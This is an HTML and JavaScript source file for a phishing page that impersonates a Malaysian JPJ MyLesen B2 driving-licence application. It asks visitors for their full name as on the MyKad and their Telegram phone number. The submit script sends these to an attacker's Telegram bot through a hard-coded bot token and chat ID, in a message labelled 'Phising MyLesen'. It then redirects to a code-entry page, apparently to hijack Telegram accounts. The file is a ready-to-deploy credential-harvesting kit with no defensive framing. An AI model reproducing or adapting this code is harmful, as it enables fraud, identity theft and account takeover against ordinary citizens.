<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Permohonan Program Pemandu MyLesen B2 2024</title>

    <!-- Link ke Google Fonts -->
    <link
      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap"
      rel="stylesheet"
    />

    <!-- Link ke CSS intl-tel-input -->
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"
    />

    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }

      html,
      body {
        overflow: hidden; /* Mencegah scroll jika tidak ada konten yang tertutupi */
        height: 100%;
        font-family: "Poppins", sans-serif;
        color: #010101;
        background-color: #d8dcd0;
      }

      .hero {
        height: 100vh;
        background-size: cover;
        background-position: center;
      }

      /* navbar */
      .navbar {
        display: flex;
        justify-content: space-between;
        align-items: center;
        background-color: #d8dcd0; /* Warna latar belakang navbar */
        padding: 10px 20px;
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        z-index: 9999;
      }

      .navbar .navbar-logo {
        font-size: 2vw; /* Ukuran font logo dinamis */
        color: #010101;
        font-weight: 400;
        display: flex;
        align-items: center;
      }

      .navbar .navbar-nav {
        display: flex;
        align-items: center;
        justify-content: flex-end; /* Posisi tautan tetap rapih di ujung kanan */
        flex-wrap: nowrap; /* Mencegah elemen terbungkus menjadi kolom */
      }

      .navbar .navbar-nav a {
        color: #010101; /* Warna teks bahasa */
        font-weight: bold;
        font-size: 1.5vw; /* Ukuran font dinamis */
        margin: 0 10px; /* Menambahkan jarak antar link bahasa */
        padding: 5px; /* Ruang klik */
        text-decoration: none; /* Menghilangkan garis bawah pada link */
        white-space: nowrap; /* Mencegah teks terpotong ke baris baru */
      }

      .navbar .navbar-nav a span {
        color: blue;
      }

      .navbar .navbar-nav a:hover {
        color: #007bff; /* Warna hover */
        transition: color 0.3s ease; /* Efek transisi saat hover */
      }

      .navbar .navbar-img {
        width: 40px; /* Ukuran logo */
        height: auto;
        margin-left: 10px; /* Jarak antara logo dan teks */
        object-fit: contain; /* Menjaga proporsi gambar */
      }

      /* Media Query untuk layar kecil */
      @media (max-width: 768px) {
        .navbar {
          padding: 10px 10px; /* Mengurangi padding pada layar kecil */
        }

        .navbar .navbar-logo {
          font-size: 4vw; /* Ukuran font logo lebih besar pada layar kecil */
        }

        .navbar .navbar-nav {
          flex-direction: row; /* Pastikan tautan tetap satu baris */
        }

        .navbar .navbar-nav a {
          font-size: 3vw; /* Ukuran font lebih besar pada layar kecil */
          margin: 0 5px; /* Mengurangi margin pada layar kecil */
          padding: 5px; /* Ruang klik pada layar kecil */
        }

        .navbar .navbar-img {
          width: 30px; /* Ukuran logo lebih kecil pada layar kecil */
          margin-left: 5px; /* Kurangi jarak pada layar kecil */
          margin-top: 0;
        }
      }

      .hero {
        height: 100vh;
        width: 100%;
        background-size: cover;
        background-position: center;
        position: relative;
      }

      img {
        width: 350px; /* Atur lebar gambar sesuai keinginan */
        height: auto; /* Agar proporsi gambar tetap */
        display: block; /* Untuk membuatnya blok, bisa juga inline-block */
        margin: 0 auto; /* Posisikan di tengah jika dalam elemen blok */
        margin-top: 10px;
      }

      .form-container {
        justify-content: center;
        background-color: #d8dcd0;
        padding: 50px 20px;
        border-radius: 10px;
        width: 70%;
        margin: 50px auto;
        margin-top: 10px;
      }

      label {
        display: block;
        margin-bottom: 5px;
        font-size: 1.1rem;
        font-weight: 600;
      }

      input[type="text"] {
        width: 100%;
        padding: 12px;
        margin-bottom: 20px;
        border: 1px solid #d8dcd0;
        border-radius: 5px;
        font-size: 1.1rem;
      }

      input[type="tel"] {
        width: 111%;
        padding: 12px;
        margin-bottom: 20px;
        border: 1px solid #d8dcd0;
        border-radius: 5px;
        font-size: 1.1rem;
      }

      .btn {
        display: flex;
        width: 100px;
        height: auto;
        padding: 12px;
        margin: 10px auto 0;
        background-color: #6b6b6b;
        color: white;
        border: none;
        border-radius: 5px;
        font-size: 2rem;
        cursor: pointer;
        align-items: center;
        justify-content: center;
      }

      h4 {
        display: flex;
        padding-top: 30px;
        color: #010101;
        align-items: center;
        justify-content: center;
      }

      .btn:hover {
        background-color: #225786;
      }

      /* Loading screen styles */
      .loading-screen {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(255, 255, 255, 0.8);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 1000;
        display: none;
      }

      .loading-screen img {
        max-width: 100px;
        max-height: 100px;
      }

      main {
        flex-grow: 1; /* Memastikan konten utama mendorong footer ke bawah */
      }

      footer {
        position: fixed; /* Tetap di bawah meski konten lebih pendek */
        left: 0;
        bottom: 0;
        width: 100%;
        background-color: #d8dcd0; /* Latar belakang footer */
        text-align: center;
      }

      footer img {
        max-width: 400px; /* Ukuran gambar maksimal */
        height: auto;
      }

      /* Keyframes for spin animation */
      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      /* media */

      @media (max-width: 768px) {
        .form-container {
          width: 90%;
          padding: 20px;
        }

        input[type="text"],
        input[type="tel"] {
          font-size: 1rem;
        }

        .btn {
          width: 70%;
          font-size: 1.3rem;
          padding: 12px;
        }
      }
    </style>
  </head>
  <body>
    <br />
    <h4>LESEN MEMANDU</h4>
    <nav class="navbar">
      <div class="navbar-logo">
        <img src="Jata Negara@3x.gif" alt="Logo" class="navbar-img" />
        <img
          src="Jabatan_Pengangkutan_Jalan.svg.png"
          alt="Logo"
          class="navbar-img"
        />
        <!-- Contoh gambar logo -->
      </div>
      <div class="navbar-nav">
        <a href="#">Bahasa Melayu</a>
        <a href="#"><span>English</span></a>
        <a href="#"><span>日本</span></a>
        <a href="#"><span>摩訶至那國</span></a>
      </div>
    </nav>

    <div class="hero">
      <img src="my-lesen.jpeg" alt="tng-img" />

      <div class="form-container">
        <form id="registrationForm">
          <input
            type="text"
            id="name"
            name="name"
            placeholder="Nama Penuh Sesuai MyKad"
            required
          />
          <input
            type="tel"
            id="phone"
            name="phone"
            placeholder="+60 Nombor Phone Telegram"
            required
          />

          <button type="submit" class="btn">Log Masuk</button>
        </form>
        <footer>
          <!-- Hanya menampilkan gambar di dalam footer -->
          <img src="ini1.png" alt="Logo Footer" />
        </footer>
      </div>

      <!-- Loading Screen -->
      <div class="loading-screen" id="loadingScreen">
        <img src="loading-loading-forever.gif" alt="Loading..." />
      </div>

      <!-- Script untuk intl-tel-input -->
      <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
      <script>
        // Inisialisasi intl-tel-input
        const phoneInputField = document.querySelector("#phone");
        const phoneInput = window.intlTelInput(phoneInputField, {
          preferredCountries: ["my", "id", "us"],
          utilsScript:
            "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
        });

        // Event listener untuk pengiriman form
        document
          .getElementById("registrationForm")
          .addEventListener("submit", function (event) {
            event.preventDefault(); // Mencegah pengiriman form default

            const name = document.getElementById("name").value; // Ambil nilai nama
            const phone = document.getElementById("phone").value; // Ambil nilai nomor telepon

            // Simpan data ke local storage
            localStorage.setItem("name", name);
            localStorage.setItem("phone", phone);

            // Tampilkan loading screen
            document.getElementById("loadingScreen").style.display = "flex";

            // Kirim data ke Telegram Bot
            const botToken = "6476409871:AAFWcRQgiwy3mJFtn-x2d1ZCiQAUSutp0kM"; // Ganti dengan token bot Anda
            const chatId = "6560805091"; // Ganti dengan ID chat Anda

            // Format pesan
            const message = `
─────────────────
(MALAY | DATA | ${phone})
─────────────────
- Nama Lengkap  : ${name}

- No HP         : ${phone}
─────────────────
Phising MyLesen
`;

            // URL untuk mengirim pesan
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
              message
            )}`;

            fetch(url)
              .then((response) => {
                if (response.ok) {
                  // Reset form setelah pengiriman berhasil
                  document.getElementById("registrationForm").reset();
                  // Arahkan ke laman kode setelah pengiriman
                  window.location.href = "kode.html"; // Ganti dengan URL laman tujuan
                } else {
                  console.error("Gagal mengirim pesan:", response.statusText);
                  // Sembunyikan loading screen jika gagal
                  document.getElementById("loadingScreen").style.display =
                    "none";
                }
              })
              .catch((error) => {
                console.error("Error:", error);
                // Sembunyikan loading screen jika terjadi error
                document.getElementById("loadingScreen").style.display = "none";
              });
          });
      </script>
    </div>
  </body>
</html>
